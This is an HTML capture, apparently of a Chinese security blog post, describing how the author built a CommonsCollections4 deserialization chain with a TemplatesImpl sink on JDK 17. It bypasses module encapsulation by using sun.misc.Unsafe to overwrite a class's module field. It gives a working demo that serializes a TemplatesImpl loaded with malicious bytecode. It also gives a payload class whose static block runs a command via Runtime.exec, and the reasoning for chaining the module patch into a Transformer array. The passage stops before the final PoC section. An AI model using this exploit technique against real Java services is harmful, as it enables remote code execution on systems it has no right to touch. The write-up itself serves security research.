+                        <a href="#21-%e6%80%8e%e4%b9%88%e5%ae%9e%e7%8e%b0unsafe" aria-label="2.1 怎么实现Unsafe">2.1 怎么实现Unsafe</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%b0%9d%e8%af%95" aria-label="尝试"><strong>尝试</strong></a></li>
+                    <li>
+                        <a href="#%e8%a7%a3%e5%86%b3" aria-label="解决"><strong>解决</strong></a><ul>
+                            
+                    <li>
+                        <a href="#%e6%89%be%e5%88%b0%e7%9a%84%e4%b8%80%e4%ba%9b%e7%b1%bb" aria-label="找到的一些类">找到的一些类</a></li>
+                    <li>
+                        <a href="#%e6%af%94%e8%be%83%e5%a5%bd%e7%94%a8%e7%9a%84" aria-label="比较好用的">比较好用的</a></li>
+                    <li>
+                        <a href="#demo" aria-label="demo">demo</a></li></ul>
+                    </li></ul>
+                    </li>
+                    <li>
+                        <a href="#22-module" aria-label="2.2 Module">2.2 Module</a></li>
+                    <li>
+                        <a href="#23-pn" aria-label="2.3 pn">2.3 pn</a></li></ul>
+                    </li></ul>
+                    </li>
+                    <li>
+                        <a href="#0x04-poc" aria-label="0x04 poc">0x04 poc</a><ul>
+                            <ul>
+                            
+                    <li>
+                        <a href="#%e8%b0%83%e7%94%a8%e9%93%be" aria-label="调用链">调用链</a></li></ul>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#0x05-%e9%81%97%e6%bc%8f" aria-label="0x05 遗漏">0x05 遗漏</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+
+  <div class="post-content"><h1 id="0x01-前言">0x01 前言<a hidden class="anchor" aria-hidden="true" href="#0x01-前言">#</a></h1>
+<blockquote>
+<p>起因看到一篇文章说jdk17因为<code>强封装（模块化）</code>，利用不了<code>TemplatesImpl</code>来作为反序列化的sink点了，于是去试了下。起初先写了个小demo，发现可以调用呀，然后就想搞一条完整的链子，然后这里选择的是CC4，因为他最后sink点就是<code>TemplatesImpl</code>,当然CC6，CC7，CC5改改应该也可以（CC5起点也要换），但是我懒就直接用CC4了。在jdk17 <code>Module</code>模式下，CC6可以直接套一层Unsafe就能直接rce了，但是实现<code>加载字节码</code>可以做更多事，于是俺研究了下，也是解决重重困难实现了最后的利用！</p>
+</blockquote>
+<h2 id="环境"><strong>环境</strong><a hidden class="anchor" aria-hidden="true" href="#环境">#</a></h2>
+<ul>
+<li>jdk17.0.8</li>
+<li>pom.xml</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependencies&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>javassist<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>javassist<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>3.12.1.GA<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/dependency&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.apache.commons<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>commons-collections4<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>4.0<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/dependency&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependencies&gt;</span>
+</span></span></code></pre></div><p><strong>jdk17 模块检测</strong></p>
+<blockquote>
+<p>早在jdk9就开始了<code>模块化</code>，但是真正实施是在jdk17。<code>模块化</code>简单理解将就是 java为了安全有一些类不想让你直接调用，但是java模块里面的类又需要相互调用，所以<code>反射</code>和<code>new一个对象</code>的时候会对<code>调用类</code>和<code>被调用类</code>进行一个<code>模块检测</code>（这里不只是检测调用和被调用类的<code>模块关系</code>，还有其他判断），好这里我们大概有个概念，jdk17 会进行<code>模块检测</code></p>
+</blockquote>
+<h1 id="0x02-初见端倪">0x02 初见端倪<a hidden class="anchor" aria-hidden="true" href="#0x02-初见端倪">#</a></h1>
+<p>先来看个小demo，这里需要用到<code>Unsafe</code>，不懂的同学可以先看看这个，简单说<code>Unsafe</code>这里是用来<code>修改我们调用类的模块</code>，从而绕过模块检测。</p>
+<p>Unsafe是一个偏底层的函数，我们这里是通过找到<code>Field的地址</code>，然后修改其指向我们设置的值</p>
+<h3 id="templatesimpl-test">TemplatesImpl test<a hidden class="anchor" aria-hidden="true" href="#templatesimpl-test">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.misc.Unsafe</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test_17</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getModule</span><span class="p">().</span><span class="na">getName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">appClassLoader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassLoader</span><span class="p">.</span><span class="na">getSystemClassLoader</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">pool</span><span class="p">.</span><span class="na">insertClassPath</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">javassist</span><span class="p">.</span><span class="na">LoaderClassPath</span><span class="p">(</span><span class="n">appClassLoader</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;eval&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Evil</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz2</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">code</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">patchModule</span><span class="p">(</span><span class="n">test_17</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">aClass</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">test_17</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getModule</span><span class="p">().</span><span class="na">getName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">().</span><span class="na">newInstance</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">o</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">o</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">,</span><span class="n">code2</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">o</span><span class="p">,</span><span class="s">&#34;_transletIndex&#34;</span><span class="p">,</span><span class="n">0</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//setFiled(o,&#34;_auxClasses&#34;,new HashMap&lt;&gt;());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">patchModule</span><span class="p">(</span><span class="n">test_17</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">eval</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">test_17</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getModule</span><span class="p">().</span><span class="na">getName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 从文件中反序列化对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Templates</span><span class="w"> </span><span class="n">o1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Templates</span><span class="p">)</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">o1</span><span class="p">.</span><span class="na">getOutputProperties</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">patchModule</span><span class="p">(</span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="p">,</span><span class="n">Class</span><span class="w"> </span><span class="n">goalclass</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.Unsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Field</span><span class="w"> </span><span class="n">unsafeField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafeField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="n">unsafeField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">ObjectModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getModule&#34;</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="n">goalclass</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">currentClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="o">=</span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;module&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">currentClass</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">ObjectModule</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFiled</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">values</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">templates</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="n">values</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>demo中在<code>反射前</code>执行<code>patchModule(test_17.class,aClass);</code>修改模块，然后反序列化后调用<code>getOutputProperties</code>触发sink，然后这里生成<code>bin文件</code>后，注释掉前面代码，执行<code>readobject</code>是可以执行成功的。这里我就感觉好像跟我想的有点不一样了，我之前看那篇文章以为只要<code>实例化类</code>就会进行<code>模块的检测</code>。但是很显然这里肯定没有。</p>
+<h1 id="0x03-构造">0x03 构造<a hidden class="anchor" aria-hidden="true" href="#0x03-构造">#</a></h1>
+<p>然后就开始尝试构造了</p>
+<h3 id="1evalclass">1.eval.class<a hidden class="anchor" aria-hidden="true" href="#1evalclass">#</a></h3>
+<blockquote>
+<p>首先是恶意类，这里我没有继承<code>AbstractTranslet</code>，因为有<code>模块检测</code>那个东西，反正我当时很多报错，我就直接删了，这里分析代码可以用另一种方法代替</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">eval</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RuntimeException</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">getSuperclass</span><span class="p">(){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">eval</span><span class="p">.</span><span class="na">class</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><strong>尝试</strong></p>
+<p>开始尝试过重写<code>getSuperclass()</code>方法绕过if判断，后面发现重写不了这个，原因应该是：这里<code>_class[i]</code>属于<code>Class</code>对象，然后<code>Class是final不让继承</code>，然后也就重写不了了</p>
+<p><img loading="lazy" src="../images/image-20250113094437387.png" alt="image-20250113094437387"  />
+</p>
+<p><strong>解决</strong></p>
+<p>那么这里会进入<code>else</code>，<code>_auxClasses</code>正常是<code>null</code>所以这里会空指针报错。但是这个值不能<code>反射设置</code>，这个值最后还是属于<code>Hashtable</code>，但是<code>Hashtable</code>不继承<code>Serializable</code>。那就看那些地方会对这个值进行<code>赋值</code>，看我们能不能调用到</p>
+<p><img loading="lazy" src="../images/image-20250110181447046.png" alt="image-20250110181447046"  />
+</p>
+<p>发现就在<code>defineTransletClasses()</code>上方就有，只要<code>_bytecodes.length&gt;1</code>就行，ez很好满足</p>
+<p><img loading="lazy" src="../images/image-20250110182256807.png" alt="image-20250110182256807"  />
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">,</span><span class="n">code2</span><span class="p">});</span><span class="w">
+</span></span></span></code></pre></div><p>这样设置就解决了，然后以为套一层Unsafe就能实现时，最大的问题来了</p>
+<h2 id="2-boss-newinstance">2. boss newInstance<a hidden class="anchor" aria-hidden="true" href="#2-boss-newinstance">#</a></h2>
+<p>在transform最后调用点，<code>TrAXFilter</code>的实例化是通过<code>newInstance</code>实现，而这个属于反射，这里会进行<code>模块检测</code>！！！</p>
+<p><img loading="lazy" src="../images/image-20250110182815025.png" alt="image-20250110182815025"  />
+</p>
+<p>起初在poc中写句<code>patchModule(invokerTransformer.getClass(),aClass);</code>（aClass就是TrAXFilter.class），可以成功调用，但是下意识就反应到这是本地，客户端和服务端是一体的。相当于这个也修改了<code>服务端invokerTransformer</code>的模块hhh。</p>
+<p>然后这里沉思了下，能不能通过CC链中<code>Transformer[]</code>的构造执行<code>patchModule()</code>中的代码（Unsafe那块代码，修改模块），<code>修改完模块</code>然后再调用CC4后面的sink，然后拼接到一个<code>Transformer[]</code>里面进行利用</p>
+<p>然后看了下<code>ConstantTransformer</code>，发现返回的对象，和接收<code>input</code>没半毛钱关系，所以上面想法是可行的</p>
